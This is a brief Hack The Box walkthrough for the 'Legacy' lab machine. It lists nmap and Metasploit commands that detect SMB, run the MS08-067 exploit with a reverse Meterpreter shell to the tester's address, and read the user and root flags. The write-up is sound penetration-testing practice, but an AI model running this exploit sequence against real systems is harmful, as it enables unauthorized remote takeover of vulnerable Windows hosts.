# Hack The Box - Legacy

```sh
export IP=10.10.10.4
```

```sh
sudo nmap -A -T4 -p- -oN nmap-initial $IP
```
![nmap-initial](screenshots/nmap-initial.png)

Start metasploit
```sh
msfconsole
```

```
search msb_version
```
![msf-smb_version]("./screenshots/mfs-smb_version.png")

```
use auxiliary/scanner/smb/smb_version
```

```
set rhosts 10.10.10.4
```

```
run 
```
![msf-smb_version_result]("./screenshots/mfs-smb_version_res.png")

```
use exploit/windows/smb/ms08_067_netapi
```

Set RHOSTS
```
set rhosts 10.10.10.4
```
Check your ip addr tun0
Set LHOST
```
set lhost 10.10.14.3
```

```
exploit
```

In meterpreter shell
```
getuid
```
```
sysinfo
```
![meterpreter-info]("./screenshots/meterpreter-info.png")

```
cd ../../"documents and settings"
```
```
dir
```
![meterpreter-doc_set]("./screenshots/meterpreter-doc_set.png")
```
cd john/Desktop
```

```
cat user.txt
```
![user-flag]("./screenshots/user-flag.png")

```
cd ../../Administrator/Desktop
```

```
cat root.txt
```
![root-flag]("./screenshots/root-flag.png")
